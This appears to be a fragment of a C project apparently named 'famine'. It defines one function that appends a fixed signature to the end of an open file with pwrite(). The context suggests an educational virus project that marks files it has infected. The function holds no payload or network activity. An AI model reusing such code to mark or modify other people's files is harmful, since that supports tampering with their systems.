#include "famine.h"

#include <sys/types.h> // ssize_t

#include <unistd.h> // pwrite()

int sign_generic_append(t_file *file)
{
	ssize_t written;

	written = pwrite(file->fd, SIGNATURE, SIGNATURE_SIZE, file->size);
	if (written != (ssize_t)SIGNATURE_SIZE)
		return (1);
	return (0);
}
